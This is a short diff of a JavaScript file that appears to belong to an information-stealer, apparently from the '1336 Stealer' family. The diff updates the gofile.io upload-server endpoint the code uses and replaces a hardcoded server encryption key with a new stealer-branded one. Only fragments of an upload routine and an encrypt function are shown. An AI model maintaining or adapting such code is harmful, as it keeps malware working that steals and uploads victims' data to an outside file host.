@@ -15,7 +15,7 @@ async function upload(path) {
 
 async function getServer() {
     const res = await axios({
-        url: `https://apiv2.gofile.io/getServer`,
+        url: `https://api.gofile.io/getServer`,
         method: "GET",
         headers: {
             accept: "*/*",
@@ -68,7 +68,7 @@ if (args.length != 3) {
 }
 
 // Key of the server
-const key = "1336StealerWillNeverDied";
+const key = "stanleySMODSPIRATESTEALER0109222";
 const crypto = require('crypto');
 
 function encrypt(plainText) {
